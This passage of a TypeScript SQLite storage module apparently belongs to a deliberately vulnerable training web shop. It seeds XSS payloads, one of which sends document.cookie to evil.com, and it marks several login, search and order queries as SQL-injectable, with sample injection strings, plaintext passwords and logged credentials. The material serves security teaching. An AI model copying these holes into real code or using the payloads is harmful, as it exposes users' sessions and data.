    insertReviewStmt.run(randomUUID(), productIds[12], customerIds[3], "royal_curry", 5,
      "Fresh coriander essential for authentic curries. Always top quality! <script>alert('review-xss')</script>", daysAgo(13));

    // Add contact submissions with XSS
    const insertContactStmt = this.db.prepare(`
      INSERT INTO contact_submissions (id, name, email, company, message, created_at)
      VALUES (?, ?, ?, ?, ?, ?)
    `);

    insertContactStmt.run(randomUUID(), "Tom Baker", "tom@newcafe.co.uk", "The New Café",
      "Hi, I'm opening a new café in Didsbury and would like to discuss wholesale pricing for fruit and vegetables. Could someone contact me?", daysAgo(4));

    insertContactStmt.run(randomUUID(), "Lisa Morton", "lisa.morton@catering.com", "Morton Events",
      "We run corporate catering events and need a reliable supplier for fresh produce. Do you offer next-day delivery? <img src=x onerror=fetch('http://evil.com/?cookie='+document.cookie)>", daysAgo(2));

    insertContactStmt.run(randomUUID(), "James Wilson", "james@wilsonrestaurants.co.uk", null,
      "Question about your organic certification. Do you have documentation I can review?", daysAgo(6));
  }

  // VULNERABILITY: SQL Injection in getUserByUsername - used by login
  async getUserByUsername(username: string): Promise<User | undefined> {
    // INTENTIONALLY VULNERABLE: String concatenation instead of parameterized query
    // This allows SQL injection attacks like: ' OR '1'='1' --
    const query = `SELECT * FROM users WHERE username='${username}'`;
    const row = this.db.prepare(query).get() as any;

    if (!row) return undefined;

    return {
      id: row.id,
      username: row.username,
      password: row.password,
      email: row.email,
      companyName: row.company_name,
      contactPerson: row.contact_person,
      phone: row.phone,
      address: row.address,
      role: row.role,
      bio: row.bio,
    };
  }

  // VULNERABILITY: SQL Injection in login
  async getUserByCredentials(username: string, password: string): Promise<User | undefined> {
    // INTENTIONALLY VULNERABLE: String concatenation instead of parameterized query
    // This allows SQL injection attacks like: ' OR '1'='1' --
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log(`Executing SQL: ${query}`); // Log for debugging/educational purposes
    const row = this.db.prepare(query).get() as any;

    if (!row) return undefined;

    return {
      id: row.id,
      username: row.username,
      password: row.password,
      email: row.email,
      companyName: row.company_name,
      contactPerson: row.contact_person,
      phone: row.phone,
      address: row.address,
      role: row.role,
      bio: row.bio,
    };
  }

  // VULNERABILITY: SQL Injection in searchProducts
  async searchProducts(query: string): Promise<Product[]> {
    // INTENTIONALLY VULNERABLE: String concatenation
    // Attack: '; DROP TABLE products--
    const sql = `SELECT * FROM products WHERE name LIKE '%${query}%' OR category LIKE '%${query}%'`;
    const rows = this.db.prepare(sql).all() as any[];

    return rows.map(row => ({
      id: row.id,
      name: row.name,
      description: row.description,
      category: row.category,
      unit: row.unit,
      pricePerUnit: row.price_per_unit.toString(),
      imageUrl: row.image_url,
      stock: row.stock,
    }));
  }

  // Safe methods (use parameterized queries)
  async getUser(id: string): Promise<User | undefined> {
    const row = this.db.prepare("SELECT * FROM users WHERE id = ?").get(id) as any;
    if (!row) return undefined;

    return {
      id: row.id,
      username: row.username,
      password: row.password,
      email: row.email,
      companyName: row.company_name,
      contactPerson: row.contact_person,
      phone: row.phone,
      address: row.address,
      role: row.role,
      bio: row.bio,
    };
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    this.db.prepare(`
      INSERT INTO users (id, username, password, email, company_name, contact_person, phone, address, role, bio)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'customer', ?)
    `).run(
      id,
      insertUser.username,
      insertUser.password, // VULNERABILITY: Plaintext password
      insertUser.email,
      insertUser.companyName || null,
      insertUser.contactPerson || null,
      insertUser.phone || null,
      insertUser.address || null,
      insertUser.bio || null
    );

    return (await this.getUser(id))!;
  }

  async updateUser(id: string, updates: Partial<User>): Promise<User | undefined> {
    const user = await this.getUser(id);
    if (!user) return undefined;

    const updatedUser = { ...user, ...updates };

    this.db.prepare(`
      UPDATE users SET 
        username = ?, password = ?, email = ?, company_name = ?,
        contact_person = ?, phone = ?, address = ?, role = ?, bio = ?
      WHERE id = ?
    `).run(
      updatedUser.username,
      updatedUser.password,
      updatedUser.email,
      updatedUser.companyName,
      updatedUser.contactPerson,
      updatedUser.phone,
      updatedUser.address,
      updatedUser.role,
      updatedUser.bio,
      id
    );

    return updatedUser;
  }

  async getAllUsers(): Promise<User[]> {
    const rows = this.db.prepare("SELECT * FROM users").all() as any[];
    return rows.map(row => ({
      id: row.id,
      username: row.username,
      password: row.password,
      email: row.email,
      companyName: row.company_name,
      contactPerson: row.contact_person,
      phone: row.phone,
      address: row.address,
      role: row.role,
      bio: row.bio,
    }));
  }

  async getAllProducts(): Promise<Product[]> {
    const rows = this.db.prepare("SELECT * FROM products").all() as any[];
    return rows.map(row => ({
      id: row.id,
      name: row.name,
      description: row.description,
      category: row.category,
      unit: row.unit,
      pricePerUnit: row.price_per_unit.toString(),
      imageUrl: row.image_url,
      stock: row.stock,
    }));
  }

  async getProduct(id: string): Promise<Product | undefined> {
    const row = this.db.prepare("SELECT * FROM products WHERE id = ?").get(id) as any;
    if (!row) return undefined;

    return {
      id: row.id,
      name: row.name,
      description: row.description,
      category: row.category,
      unit: row.unit,
      pricePerUnit: row.price_per_unit.toString(),
      imageUrl: row.image_url,
      stock: row.stock,
    };
  }

  async createProduct(insertProduct: InsertProduct): Promise<Product> {
    const id = randomUUID();
    this.db.prepare(`
      INSERT INTO products (id, name, description, category, unit, price_per_unit, image_url, stock)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      id,
      insertProduct.name,
      insertProduct.description,
      insertProduct.category,
      insertProduct.unit,
      parseFloat(insertProduct.pricePerUnit),
      insertProduct.imageUrl,
      insertProduct.stock
    );

    return (await this.getProduct(id))!;
  }

  async getAllOrders(): Promise<Order[]> {
    const rows = this.db.prepare("SELECT * FROM orders ORDER BY created_at DESC").all() as any[];
    return rows.map(row => ({
      id: row.id,
      userId: row.user_id,
      orderNumber: row.order_number,
      status: row.status,
      totalAmount: row.total_amount.toString(),
      deliveryDate: row.delivery_date,
      deliveryAddress: row.delivery_address,
      notes: row.notes,
      createdAt: new Date(row.created_at),
    }));
  }

  async getUserOrders(userId: string): Promise<Order[]> {
    const rows = this.db.prepare("SELECT * FROM orders WHERE user_id = ? ORDER BY created_at DESC").all(userId) as any[];
    return rows.map(row => ({
      id: row.id,
      userId: row.user_id,
      orderNumber: row.order_number,
      status: row.status,
      totalAmount: row.total_amount.toString(),
      deliveryDate: row.delivery_date,
      deliveryAddress: row.delivery_address,
      notes: row.notes,
      createdAt: new Date(row.created_at),
    }));
  }

  async getOrder(id: string): Promise<Order | undefined> {
    // VULNERABILITY: SQL Injection via string concatenation
    // SECURE VERSION: const row = this.db.prepare("SELECT * FROM orders WHERE id = ?").get(id) as any;
    const row = this.db.prepare(`SELECT * FROM orders WHERE id = '${id}'`).get() as any;
    if (!row) return undefined;

    return {
      id: row.id,
      userId: row.user_id,
      orderNumber: row.order_number,
      status: row.status,
      totalAmount: row.total_amount.toString(),
      deliveryDate: row.delivery_date,
      deliveryAddress: row.delivery_address,
      notes: row.notes,
      createdAt: new Date(row.created_at),
    };
  }

  async createOrder(insertOrder: InsertOrder): Promise<Order> {
    const id = randomUUID();
    const orderNumber = `MFF-${this.orderCounter++}`;
    const now = new Date().toISOString();

    this.db.prepare(`
      INSERT INTO orders (id, user_id, order_number, status, total_amount, delivery_date, delivery_address, notes, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      id,
      insertOrder.userId,
      orderNumber,
      insertOrder.status || "pending",
      parseFloat(insertOrder.totalAmount),
      insertOrder.deliveryDate || null,
      insertOrder.deliveryAddress || null,
      insertOrder.notes || null,
      now
    );

    return (await this.getOrder(id))!;
  }

  async updateOrderStatus(id: string, status: string): Promise<Order | undefined> {
    const order = await this.getOrder(id);
    if (!order) return undefined;

    this.db.prepare("UPDATE orders SET status = ? WHERE id = ?").run(status, id);
    return await this.getOrder(id);
  }

  async getOrderItems(orderId: string): Promise<OrderItem[]> {
    // VULNERABILITY: SQL Injection via string concatenation
    // SECURE VERSION: const rows = this.db.prepare("SELECT * FROM order_items WHERE order_id = ?").all(orderId) as any[];
    const rows = this.db.prepare(`SELECT * FROM order_items WHERE order_id = '${orderId}'`).all() as any[];
    return rows.map(row => ({
      id: row.id,
      orderId: row.order_id,
      productId: row.product_id,
      productName: row.product_name,
      quantity: row.quantity,
      pricePerUnit: row.price_per_unit.toString(),
      subtotal: row.subtotal.toString(),
    }));
  }

  async createOrderItem(insertItem: InsertOrderItem): Promise<OrderItem> {
    const id = randomUUID();
    this.db.prepare(`
      INSERT INTO order_items (id, order_id, product_id, product_name, quantity, price_per_unit, subtotal)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(
      id,
      insertItem.orderId,
      insertItem.productId,
      insertItem.productName,
      insertItem.quantity,
      parseFloat(insertItem.pricePerUnit),
      parseFloat(insertItem.subtotal)
    );

    const items = await this.getOrderItems(insertItem.orderId);
    return items.find(item => item.id === id)!;
  }

  async getProductReviews(productId: string): Promise<Review[]> {
    const rows = this.db.prepare("SELECT * FROM reviews WHERE product_id = ? ORDER BY created_at DESC").all(productId) as any[];
    return rows.map(row => ({
      id: row.id,
      productId: row.product_id,
      userId: row.user_id,
      username: row.username,
      rating: row.rating,
      comment: row.comment,
      createdAt: new Date(row.created_at),
    }));
  }

  async createReview(insertReview: InsertReview): Promise<Review> {
    const id = randomUUID();
    const now = new Date().toISOString();

    // Get username from user
    const user = await this.getUser(insertReview.userId);
    const username = user?.username || "Unknown";

    this.db.prepare(`
      INSERT INTO reviews (id, product_id, user_id, username, rating, comment, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(
      id,
      insertReview.productId,
      insertReview.userId,
      username,
      insertReview.rating,
      insertReview.comment || null,
      now
    );

    const reviews = await this.getProductReviews(insertReview.productId);
    return reviews.find(r => r.id === id)!;
  }

  async getAllContactSubmissions(): Promise<ContactSubmission[]> {
    const rows = this.db.prepare("SELECT * FROM contact_submissions ORDER BY created_at DESC").all() as any[];
    return rows.map(row => ({
      id: row.id,
      name: row.name,
      email: row.email,
      company: row.company,
      message: row.message,
      createdAt: new Date(row.created_at),
    }));
  }

  async createContactSubmission(insertContact: InsertContact): Promise<ContactSubmission> {
    const id = randomUUID();
    const now = new Date().toISOString();

    this.db.prepare(`
      INSERT INTO contact_submissions (id, name, email, company, message, created_at)
      VALUES (?, ?, ?, ?, ?, ?)
    `).run(
      id,
      insertContact.name,
      insertContact.email,
      insertContact.company || null,
      insertContact.message,
      now
    );

    const contacts = await this.getAllContactSubmissions();
    return contacts.find(c => c.id === id)!;
  }
}

// Initialize SQLite database with INTENTIONALLY VULNERABLE queries
const db = initializeDatabase();
export const storage = new SQLiteStorage(db);
